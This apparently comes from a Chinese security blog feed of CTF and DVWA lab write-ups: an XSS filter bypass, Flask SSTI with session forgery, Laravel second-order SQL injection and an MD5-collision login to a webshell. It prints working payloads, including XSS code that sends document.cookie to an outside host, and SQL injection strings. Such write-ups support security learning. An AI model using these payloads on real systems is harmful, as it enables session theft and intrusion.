e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]&#125;function a(n)&#123;var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r&#125;function d(n)&#123;var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r&#125;function h(n)&#123;return a(i(d(n),8*n.length))&#125;function l(n,t)&#123;var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))&#125;function g(n)&#123;var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e&#125;function v(n)&#123;return unescape(encodeURIComponent(n))&#125;function m(n)&#123;return h(v(n))&#125;function p(n)&#123;return g(m(n))&#125;function s(n,t)&#123;return l(v(n),v(t))&#125;function C(n,t)&#123;return g(s(n,t))&#125;function A(n,t,r)&#123;return t?r?s(t,n):C(t,n):r?m(n):p(n)&#125;&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function()&#123;return A&#125;):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A&#125;(this);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function rot13(inp) &#123;</span></span><br><span class="line"><span class="string">        return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function generate_token() &#123;</span></span><br><span class="line"><span class="string">        var phrase = document.getElementById(&quot;phrase&quot;).value;</span></span><br><span class="line"><span class="string">        document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    generate_token();</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>generate_token()</code>函数设置了一个<code>token=md5(rot13($phrase))</code></p><p>有因为<code>phrase=&#39;success&#39;</code>,所以带上这个<code>token</code>应该就对了。</p><p>因为这个函数是前台的，我们直接用<code>console</code>，修改运行一下，就能得到<code>token</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function generate_token() &#123;</span><br><span class="line">        var phrase &#x3D; &#39;success&#39;;</span><br><span class="line">        alert(md5(rot13(phrase)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/317F6r54cNS9pQx.png"></p><h2 id="Medium-13"><a href="#Medium-13" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;script src=&quot;/vulnerabilities/javascript/source/medium.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>采用引用的外部js的方式</p><p><code>setTimeout</code>是一个计时器，300毫秒就执行一次<code>do_elsesomething(&quot;XX&quot;)</code>，而<code>token</code>就在这个函数设置。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.length - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    do_elsesomething(<span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_elsesomething</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = do_something(e + <span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value + <span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="High-12"><a href="#High-12" class="headerlink" title="High"></a>High</h2><p>高级和中级类似，生成 token 的逻辑在额外的 js 文件中。和中级不同的是，这里的 JS 经过了混淆的。。。就显得很混乱。</p><p>推荐一个网站<a href="http://deobfuscatejavascript.com/#">http://deobfuscatejavascript.com/#</a></p><p>用来解js的混淆，挺好用的，或者直接看未混淆版的（<code>dvwa\vulnerabilities\javascript\source\high_unobfuscated.js</code>）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.length - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_3</span>(<span class="params">t, y = <span class="string">&quot;ZZ&quot;</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = sha256(<span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value + y)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_2</span>(<span class="params">e = <span class="string">&quot;YY&quot;</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = sha256(e + <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_1</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = do_something(<span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    token_part_2(<span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;send&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>, token_part_3);</span><br><span class="line">token_part_1(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br></pre></td></tr></table></figure><p>这里生成 token 的步骤是：</p><p>1、执行<code>token_part_1(&quot;ABCD&quot;, 44)</code><br>2、执行<code>token_part_2(&quot;XX&quot;)</code>(原本是延迟 300ms执行的那个）<br>3、点击按钮的时候执行 <code>token_part_3</code></p><p>所以我们在输入框输入 success 后，再到控制台中输入<code>token_part_1(&quot;ABCD&quot;, 44)</code>和<code>token_part_2(&quot;XX&quot;)</code>这两个函数就可以了。</p><p>我这里没加载出js,我直接整个代码放到console执行，也是可以的，但是注意改一下执行顺序：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">token_part_1(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;token_part_2(<span class="string">&quot;XX&quot;</span>)&#125;,<span class="number">300</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;send&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>, token_part_3); </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/c4sHdulIvqW15PQ.png"></p><h2 id="Impossible-12"><a href="#Impossible-12" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.</span><br></pre></td></tr></table></figure><p>哈哈哈哈哈哈。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://www.freebuf.com/author/lonehand">新手指南：DVWA-1.9全级别教程</a>，安全客，lonehand</li></ol>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> XSS </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杭电Hgame2019-week4-WP</title>
      <link href="/2019/02/23/Hgame2019-week4/"/>
      <url>/2019/02/23/Hgame2019-week4/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="HappyXSS"><a href="#HappyXSS" class="headerlink" title="HappyXSS"></a>HappyXSS</h2><blockquote><p>Description<br>同上周，但是增加了一点点难度。<br>URL <a href="http://118.25.18.223:7000/index.php">http://118.25.18.223:7000/index.php</a></p></blockquote><p>测试发现会将<code>&lt;/script&gt;</code>替换成<code>Happy!</code>。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                    substr(md5($_POST[&quot;code&quot;]),0,4)===7ece<span class="tag">&lt;<span class="name">br</span>&gt;</span> Happy! alert(xss&#x27;) Happy!                 <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>继续测试发现过滤的字符有：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#x2F;script&gt;svgimgdocumentcookie</span><br><span class="line">&quot;&amp;#</span><br></pre></td></tr></table></figure><p>找到一个payload，但是直接用肯定不行，加上img元素又会碰到其他的敏感字导致替换：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;select autofocus onfocus&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><hr><p>看了一叶飘零的WP，了解到可以通过<strong>ascii码拼接的方式bypass</strong>，自己XSS这块掌握的还是不熟==、</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus&#x3D;javascript:eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,50,53,48,48,48,47,63,115,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59)); autofocus&gt;</span><br></pre></td></tr></table></figure><p>我还注意到另一位大佬，用字符串拼接的方式，因为<code>&quot;&quot;</code>被过滤了，采用<code>&#39;&#39;</code>或者反引号来拼接</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&#39;javascript:var a &#x3D; &#96;btoa(documen&#96; + &#96;t&#96;+&#96;.cooki&#96;+&#96;e)&#96;;</span><br><span class="line">var b&#x3D;decodeURIComponent(&#96;%2f&#96;);</span><br><span class="line">var url &#x3D;&#96;http:&#96; + b + b  + &#96;xss.wuhan5.cc&#96; + b + &#96;?cooki&#96;+&#96;e&#x3D;&#96; +eval(a);</span><br><span class="line">var d &#x3D; &#96;&lt;li&#96; + &#96;nk type&#x3D;text&#x2F;css rel&#x3D;styleSheet hr&#96;+ &#96;ef&#x3D;&#96; + url +&#96; &#x2F;&gt;&#96;;</span><br><span class="line">var e &#x3D; &#96;docu&#96; + &#96;ment.write(\&#96;&#96; + d + &#96;\&#96;)&#96;;</span><br><span class="line">eval(e);</span><br><span class="line">&#39;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/26/5c748fc3868c7.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHPSESSID&#x3D;5vbcci1j0uq760ucltd181pof5; Flag&#x3D;hgame&#123;Xss_1s_Re@llY_Haaaaaappy!!!&#125;</span><br></pre></td></tr></table></figure><h2 id="happyPython"><a href="#happyPython" class="headerlink" title="happyPython"></a>happyPython</h2><blockquote><p>Description<br>flag 在管理员账号下<br>URL <a href="http://118.25.18.223:3001/">http://118.25.18.223:3001</a></p></blockquote><p>flask开发，容易发现SSTI</p><p><img src="https://i.loli.net/2019/02/22/5c6fa1705befa.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.25.18.223:3001&#x2F;&#123;&#123; url_for.__globals__ [&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>拿到<code>SECRET_KEY</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;SECRET_KEY&#39;: &#39;9RxdzNwq7!nOoK3*&#39;</span><br></pre></td></tr></table></figure><p>然后解密得到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;flask-session-cookie-manager-master# python session_cookie_manager.py decode -s &#39;9RxdzNwq7!nOoK3*&#39; -c &#39;.eJwlj0FqQzEMBe_idRayJctWLvORZImGQAv_J6vSu8fQ3Wze8Oa3HHnG9VXur_Mdt3I8VrkXqJ1Z3EdSj2rDKkQfTZvX0WWQDZ2q2AjTOxMZ4oqwFTWNQgZ41R7MxoqeklJNnBDFpjRqDADe04cjG4iu6cAqXbc2sucst-LXmcfr5xnf-89E07WoYQ1wDt6wVQwj15xI3mSmrqC9e19x_kfU8vcBud0_WA.XG-00g.qGnRtXgk-258_eRyCypBxUeLDoM&#39;</span><br><span class="line">&#123;u&#39;csrf_token&#39;: u&#39;83badd4231e0c6e62319b8607fd8834c298fade4&#39;, u&#39;_fresh&#39;: True, u&#39;user_id&#39;: u&#39;1&#39;, u&#39;_id&#39;: u&#39;015669cc7f45e1b7b10e572a2c175974b7a8aa3243fc5644b33deebde1fb4e970c1a5e66b6a3cf9f91b9c4339b892426000c5fc7c36b09ad8c06a95a7a8ef5f8&#39;&#125;</span><br></pre></td></tr></table></figure><p>将user改成<code>admin</code>，因为解密的数据只有一个id能算成admin，将<code>id</code>改成1。然后可以通过<a href="https://github.com/noraj/flask-session-cookie-manager">flask-session-cookie-manager</a>，伪造session</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;flask-session-cookie-manager-master# python session_cookie_manager.py encode -s &#39;9RxdzNwq7!nOoK3*&#39; -t &quot;&#123;u&#39;csrf_token&#39;: u&#39;83badd4231e0c6e62319b8607fd8834c298fade4&#39;, u&#39;_fresh&#39;: True, u&#39;user_id&#39;: u&#39;1&#39;, u&#39;_id&#39;: u&#39;015669cc7f45e1b7b10e572a2c175974b7a8aa3243fc5644b33deebde1fb4e970c1a5e66b6a3cf9f91b9c4339b892426000c5fc7c36b09ad8c06a95a7a8ef5f8&#39;&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/22/5c6fbb67e5c6b.png"></p><h2 id="happyPHP"><a href="#happyPHP" class="headerlink" title="happyPHP"></a>happyPHP</h2><blockquote><p>Description<br>flag 在管理员账号下<br>URL <a href="http://118.25.18.223:3000/">http://118.25.18.223:3000/</a></p></blockquote><p>发现源代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--https:&#x2F;&#x2F;github.com&#x2F;Lou00&#x2F;laravel--&gt;</span><br></pre></td></tr></table></figure><hr><p>2.25学习一波大佬的WP：</p><p>下载源码之后，直接搜索flag看看，发现<code>\app\Http\Controllers\SessionsController.php</code>，<code>id=1</code>时，出现flag</p><p><img src="https://i.loli.net/2019/02/26/5c7494fad5a30.png"></p><p>同时发现SQL操作：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$name = DB::select(<span class="string">&quot;SELECT name FROM `users` WHERE `name`=&#x27;&quot;</span>.Auth::user()-&gt;name.<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            session()-&gt;flash(<span class="string">&#x27;info&#x27;</span>, <span class="string">&#x27;hello &#x27;</span>.$name[<span class="number">0</span>]-&gt;name);</span><br><span class="line">            <span class="keyword">return</span> redirect()-&gt;route(<span class="string">&#x27;users.show&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里的<code>name</code>就是我们的用户名，在注册的时候是可控的，并且也没有做任何过滤，注册后登陆造成二次注入，因此可以注出管理员的 E-Mail 和密码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; UNION SELECT email FROM &#96;users&#96; WHERE &#96;id&#96; &#x3D; 1#</span><br></pre></td></tr></table></figure><p>登录后可以获得管理员的 E-Mail：<code>admin@hgame.com</code></p><p>同样的方法拿到管理员的密码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; UNION SELECT password FROM &#96;users&#96; WHERE &#96;id&#96; &#x3D; 1#</span><br></pre></td></tr></table></figure><p>可以看到是 base64 编码后的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>解码得到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;iv&quot;:&quot;rnVrqfCvfJgnvSTi9z7KLw&#x3D;&#x3D;&quot;,&quot;value&quot;:&quot;EaR\&#x2F;4fldOGP1G\&#x2F;aDK8e8u1Aldmxl+yB3s+kBAaoPods&#x3D;&quot;,&quot;mac&quot;:&quot;56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af&quot;&#125;</span><br></pre></td></tr></table></figure><p>发现密码是加密的，与<code>\app\Http\Controllers\UsersController.php</code>代码一致：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$user = User::create([</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span> =&gt; $request-&gt;name,</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span> =&gt; $request-&gt;email,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> =&gt; encrypt($request-&gt;password),</span><br><span class="line">        ]);</span><br></pre></td></tr></table></figure><p>接下来找解密方式：<a href="http://www.mamicode.com/info-detail-2152904.html">laravel cookie加密解密原理</a></p><p>Laravel主要是使用openssl_encrypt加密</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl_decrypt($encrypt, &#39;AES-256-CBC&#39;, $key, 0, $iv);</span><br></pre></td></tr></table></figure><p>这里的<code>$encrypt</code>使我们需要解密的内容，即上述 JSON 中的<code>value</code>；</p><p>``$iv<code>就是上述 JSON 中的</code>iv`了。</p><p>现在只差一个<code>key</code>了,Laravel的<code>$key</code>是指<code>env的APP_KEY</code></p><p>在github上的这个项目有3次<code>commit</code>，其中一次删除的<code>env</code>文件中有，这一点易被忽略：</p><p><img src="https://i.loli.net/2019/02/26/5c7499bf99117.png"></p><p>于是可以进行解密：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$value = <span class="string">&#x27;EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=&#x27;</span>;</span><br><span class="line">$key = base64_decode(<span class="string">&#x27;9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$iv = base64_decode(<span class="string">&#x27;rnVrqfCvfJgnvSTi9z7KLw==&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> openssl_decrypt($value, <span class="string">&#x27;AES-256-CBC&#x27;</span>, $key, <span class="number">0</span>, $iv);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现得到序列化字符串：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s:16:&quot;9pqfPIer0Ir9UUfR&quot;;</span><br></pre></td></tr></table></figure><p>即得到密码<code>9pqfPIer0Ir9UUfR</code></p><p>管理员的账户密码都得到了，登陆即可见flag</p><p><img src="https://i.loli.net/2019/02/26/5c749bdc9681d.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> XSS </tag>
            
            <tag> python </tag>
            
            <tag> SSTI </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杭电Hgame2019-week3-WP</title>
      <link href="/2019/02/15/week3-WP/"/>
      <url>/2019/02/15/week3-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="神奇的MD5"><a href="#神奇的MD5" class="headerlink" title="神奇的MD5"></a>神奇的MD5</h2><blockquote><p>Description<br>flag在根目录下(请善待学生机)<br>hint:md5碰撞 你自己本地去生成3个md5值一样的 sha值不一样的 用curl上传<br>URL <a href="http://118.25.89.91:8080/question/login.php">http://118.25.89.91:8080/question/login.php</a></p></blockquote><p>首先发现源码泄露 <code>.login.php.swp</code> </p><p><code>vim -r</code>恢复出源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (@$_POST[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> @$_POST[<span class="string">&#x27;password&#x27;</span>] <span class="keyword">and</span> @$_POST[<span class="string">&#x27;code&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        $username = (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        $password = (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        $code     = (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (($username == $password ) <span class="keyword">or</span> ($username == $code)  <span class="keyword">or</span> ($password == $code)) &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your input can&#x27;t be the same&quot;</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((md5($username) === md5($password)) <span class="keyword">and</span> (md5($password) === md5($code)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Good&quot;</span>; </span><br><span class="line"></span><br><span class="line">            header(<span class="string">&#x27;Location: admin.php&#x27;</span>);  </span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Invalid password&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...[OMITTED]...</span></span><br></pre></td></tr></table></figure><p>要求提交三个内容不同而 MD5 哈希值相同的字符串进行登录，由于对参数进行强制类型转换且使用全等进行判断，无法通过一般的数组参数、0e 开头 MD5 等方法绕过。</p><p>只能通过 MD5 碰撞的方法，使用 <a href="https://github.com/upbit/clone-fastcoll">fastcoll</a> 或 <a href="https://github.com/thereal1024/python-md5-collision">thereal1024/python-md5-collision</a> 生成一些文件</p><p>选三个文件将其内容编码后用于登录，成功后跳转至 admin.php，是一个 webshell</p><p><img src="https://i.loli.net/2019/02/23/5c70ad5cd25e1.png"></p><p>通过 <code>ls /</code> 命令可以看到 /flag，但直接 <code>cat /flag</code> 会提示无法获取</p><p>读一下 admin.php ，发现其中对输入的命令有过滤：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        $cmd = (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;The Command is : $cmd &lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">$cmd = str_replace(<span class="string">&quot;flag&quot;</span>,<span class="string">&#x27;none&#x27;</span>,$cmd);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Result is :&quot;</span>;system($cmd); <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Login First&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    